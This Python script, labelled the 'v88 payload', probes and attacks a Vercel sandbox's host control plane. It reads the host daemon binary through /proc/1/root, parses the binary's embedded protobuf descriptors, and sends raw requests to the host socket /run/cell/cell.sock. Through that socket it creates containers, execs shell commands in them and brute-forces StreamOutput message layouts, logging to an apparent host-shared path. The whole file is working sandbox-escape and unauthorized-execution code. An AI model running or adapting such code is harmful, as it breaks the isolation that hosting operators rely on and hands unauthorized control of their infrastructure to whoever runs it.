# -*- coding: utf-8 -*-
"""v88 payload: celld rawDesc gzip 解压 + FileDescriptorProto 解析 → StreamOutputRequest 精确字段
v87 发现 stream=varint,2 enum=containers.OutputStream (字段号 2), 但 processId 字段号未知
v88: 解压 rawDesc (gzip) → 解析 descriptor → 精确字段号+枚举数字 → 正确构造 StreamOutput"""
import socket, time, os, json, re, zlib, struct

OUT = '/vercel/sandbox/v88c.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v88c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def pvar(field_no, n):
    return pvarint((field_no << 3) | 0) + pvarint(n)


def rpc_raw(path, body=b'', ct='application/json', t=4):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, ct, len(body)))
        s.sendall(req.encode() + body)
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', '', b''
        head, _, rest = data.partition(b'\r\n\r\n')
        lines = head.decode(errors='replace').split('\r\n')
        return lines[0], '\n'.join(lines[1:])[:100], rest
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, '', b''


def rpc(path, body='{}', t=3):
    st, hd, bd = rpc_raw(path, body.encode(), 'application/json', t)
    return st, bd[:600].decode(errors='replace')


def exec_cmd(ctr, cid, argv, t=6):
    body = json.dumps({"containerId": cid, "process": {"argv": argv}})
    return rpc(ctr + '/Exec', body, t=t)


# ---------- protobuf 手工解析 ----------
def rd_varint(b, i):
    n = 0
    s = 0
    while True:
        x = b[i]
        i += 1
        n |= (x & 127) << s
        if not (x & 128):
            return n, i
        s += 7


def pb_fields(b, i=0, end=None):
    if end is None:
        end = len(b)
    while i < end:
        tag, i = rd_varint(b, i)
        fn, wt = tag >> 3, tag & 7
        if wt == 0:
            v, i = rd_varint(b, i)
            yield fn, v
        elif wt == 2:
            ln, i = rd_varint(b, i)
            yield fn, b[i:i + ln]
            i += ln
        elif wt == 5:
            yield fn, b[i:i + 4]
            i += 4
        elif wt == 1:
            yield fn, b[i:i + 8]
            i += 8
        else:
            return


def msg_map(blob):
    d = {}
    for fn, v in pb_fields(blob):
        d[fn] = v
    return d


TYPE_NAMES = {1: 'double', 2: 'float', 3: 'int64', 4: 'uint64', 5: 'int32', 6: 'fixed64',
              7: 'fixed32', 8: 'bool', 9: 'string', 10: 'group', 11: 'message', 12: 'bytes',
              13: 'uint32', 14: 'enum', 15: 'sfixed32', 16: 'sfixed64', 17: 'sint32', 18: 'sint64'}


def parse_file(blob):
    """FileDescriptorProto → [(msg_name, [(F, fname, fnum, ftype, tname), (E, ename, [(vname, vnum)])])]"""
    out = []
    try:
        pkg = ''
        for fn, v in pb_fields(blob):
            if fn == 2:
                pkg = v.decode(errors='replace')
        for fn, v in pb_fields(blob):
            if fn != 4:
                continue
            md = msg_map(v)
            mname = md.get(1, b'').decode(errors='replace')
            items = []
            for fn2, v2 in pb_fields(v):
                if fn2 == 2:  # field
                    fd = msg_map(v2)
                    items.append(('F',
                                  fd.get(1, b'').decode(errors='replace'),
                                  fd.get(3, b''),
                                  TYPE_NAMES.get(fd.get(5, b''), '?'),
                                  fd.get(6, b'').decode(errors='replace'),
                                  fd.get(10, b'').decode(errors='replace')))
                elif fn2 == 4:  # enum_type
                    ed = msg_map(v2)
                    ename = ed.get(1, b'').decode(errors='replace')
                    vals = []
                    for fn3, v3 in pb_fields(v2):
                        if fn3 == 2:
                            evd = msg_map(v3)
                            vals.append((evd.get(1, b'').decode(errors='replace'),
                                         evd.get(2, b'')))
                    items.append(('E', ename, vals))
            out.append((mname, items))
    except Exception as e:
        return [('PARSE-ERR %s' % e, [])]
    return out


def find_gzip_files(data):
    """找解压后含目标字符串的 gzip 块"""
    magic = b'\x1f\x8b\x08'
    off = 0
    res = []
    while True:
        i = data.find(magic, off)
        if i < 0:
            break
        off = i + 1
        try:
            d = zlib.decompressobj(16 + zlib.MAX_WBITS)
            dec = d.decompress(data[i:i + 4000000], 3000000)
            if b'StreamOutputRequest' in dec or b'OutputStream' in dec:
                res.append((i, dec))
                log('GZIP-OK @%d dec=%d' % (i, len(dec)))
        except Exception:
            pass
        if len(res) >= 30:
            break
    return res


def main():
    log('V88 payload start pid=%d' % os.getpid())
    R = '/proc/1/root'
    data = open(R + '/opt/vercel/celld', 'rb').read()
    log('celld size=%d' % len(data))

    # A. 解压 rawDesc
    blobs = find_gzip_files(data)
    log('gzip blobs=%d' % len(blobs))

    # B. 解析并提取 containers 相关 message
    targets = set()
    for off, dec in blobs:
        for mname, items in parse_file(dec):
            if any(k in mname for k in ('StreamOutput', 'OutputStream', 'Stdin', 'Exec',
                                        'WaitRequest', 'KillRequest', 'CreateRequest')):
                log('MSG %s @%d' % (mname, off))
                for it in items:
                    if it[0] == 'F':
                        log('  F %-16s #%-3d %-8s %s json=%s' % (it[1], it[2], it[3], it[4], it[5]))
                    else:
                        log('  E %s -> %s' % (it[1], it[2]))
                targets.add(mname)
    log('target msgs=%d' % len(targets))

    # C. 精确找 StreamOutputRequest 的字段号 (Getter 反推保险)
    pat = re.compile(rb'containers\.\(\*StreamOutputRequest\)\.Get([A-Za-z0-9_]+)')
    getters = sorted(set(m.group(1).decode() for m in pat.finditer(data)))
    log('SOR-Get: %s' % getters)
    pat2 = re.compile(rb'processes\.\(\*StreamOutputRequest\)\.Get([A-Za-z0-9_]+)')
    getters2 = sorted(set(m.group(1).decode() for m in pat2.finditer(data)))
    log('PSOR-Get: %s' % getters2)

    # D. 用 Getter 名反推字段号 (tag json_name 匹配)
    for gname in getters:
        json_n = gname[0].lower() + gname[1:]
        pat3 = re.compile(rb'protobuf:"[^"]*name=' + re.escape(json_n.encode()) + rb'[^"]*"')
        ms = pat3.findall(data)
        out = []
        for m in ms[:6]:
            s = m.decode(errors='replace')
            if s not in out:
                out.append(s[:130])
        if out:
            log('TAGBYGET %s(%s) -> %s' % (gname, json_n, out))

    # E. StreamOutput 用候选字段号组合测试
    CTR = '/vercel.hive.cell.api.containers.v1.ContainersService'
    st, bd = rpc(CTR + '/Create', '{"drive_id":"sandbox"}')
    cid = bd.split('"containerId":"')[1].split('"')[0] if '"containerId"' in bd else None
    log('ID=%s' % (cid or 'NONE'))
    if cid:
        rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
        time.sleep(1)
        argv = ['/bin/sh', '-c', 'echo V88_HELLO_STDOUT; echo V88_HELLO_STDERR >&2; sleep 25']
        st, bd = exec_cmd(CTR, cid, argv, t=6)
        PA = bd.split('"processId":"')[1].split('"')[0] if '"processId"' in bd else None
        log('execA PA=%s' % (PA or bd[:100]))
        time.sleep(1.5)
        # 组合: cid 字段∈{1,2}, PA 字段∈{2,3}, stream 字段∈{2,3} 且互异, stream 值 1/2
        combos = []
        for cf in (1, 2):
            for pf in (2, 3):
                for sf in (2, 3):
                    if len({cf, pf, sf}) != 3:
                        continue
                    for sv in (1, 2):
                        combos.append((cf, pf, sf, sv))
        for cf, pf, sf, sv in combos:
            pl = pstr(cf, cid) + pstr(pf, PA) + pvar(sf, sv)
            st, hd, bd = rpc_raw(CTR + '/StreamOutput',
                                 b'\x00' + struct.pack('>I', len(pl)) + pl,
                                 'application/grpc', t=4)
            log('SO cid#%d pa#%d stream#%d=%d -> %s %r' % (cf, pf, sf, sv, st, bd[:140]))
        # 只发 stream (无 cid/PA)
        for sv in (1, 2):
            pl = pvar(2, sv)
            st, hd, bd = rpc_raw(CTR + '/StreamOutput',
                                 b'\x00' + struct.pack('>I', len(pl)) + pl,
                                 'application/grpc', t=4)
            log('SO only-stream#2=%d -> %s %r' % (sv, st, bd[:140]))
        rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
        log('killed')

    log('V88C_DONE')


main()
